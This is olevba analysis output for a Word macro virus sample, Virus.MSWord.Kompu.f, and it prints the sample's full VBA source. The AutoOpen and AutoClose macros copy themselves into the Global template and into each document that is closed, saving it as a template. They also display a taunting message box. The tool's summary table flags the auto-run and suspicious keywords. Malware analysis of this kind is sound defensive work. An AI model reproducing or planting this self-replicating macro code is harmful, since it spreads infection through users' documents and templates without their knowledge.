olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu.f-314a7c2c9e9625b469c6d0d8fc4c8f4e29c59a5a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu.f-314a7c2c9e9625b469c6d0d8fc4c8f4e29c59a5a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Kompu.f-314a7c2c9e9625b469c6d0d8fc4c8f4e29c59a5a - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Exports the outline information in the current Word document into Microsoft PowerPoint."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim fileenimi$
'AutoClose
'Makrovirus Spreader
On Error Resume Next
fileenimi$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:AutoOpen", fileenimi$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoClose", fileenimi$ + ":AutoClose"
WordBasic.FileSaveAs Name:=fileenimi$, Format:=1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kompu.f-314a7c2c9e9625b469c6d0d8fc4c8f4e29c59a5a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'AutoOpen
' ================================
' = INFORMATION ABOUT THIS VIRUS =
' ================================
' Reason: Educational
' Name: Spreader
' Made in Estonia
' Made by the TPAR team
' ================================

On Error Resume Next
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
WordBasic.FileSaveAll 1
WordBasic.MsgBox "Still don't see the text ? I'll fix that problem ;)"
WordBasic.ViewZoom200
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

